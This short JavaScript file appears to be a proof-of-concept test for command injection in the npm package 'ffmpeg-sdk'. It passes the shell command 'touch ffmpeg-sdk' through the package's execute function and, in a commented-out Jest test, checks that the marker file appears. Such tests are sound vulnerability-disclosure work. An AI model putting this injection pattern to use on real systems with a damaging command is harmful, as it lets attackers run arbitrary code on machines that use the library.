const root = require("ffmpeg-sdk");
root.execute("touch ffmpeg-sdk")
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      // file_exist = fs.existsSync(path);
      // expect(file_exist).toBe(true);
      // fs.unlink(path, function (err) {});
    });

// test("Command Injection in ffmpeg-sdk", () => {
//   expect.assertions(2);
//   const root = require("ffmpeg-sdk");
//   const fs = require("fs");
//   const path = "./ffmpeg-sdk";
//   try {
//     if (fs.existsSync(path)) {
//       fs.unlinkSync(path);
//       console.log("File removed:", path);
//     }
//   } catch (err) {
//     console.error(err);
//   }
//   file_exist = fs.existsSync(path);
//   expect(file_exist).toBe(false);
//   return root
//     .execute("touch ffmpeg-sdk")
//     .then(() => {})
//     .catch((err) => {})
//     .finally(() => {
//       file_exist = fs.existsSync(path);
//       expect(file_exist).toBe(true);
//       fs.unlink(path, function (err) {});
//     });
// });
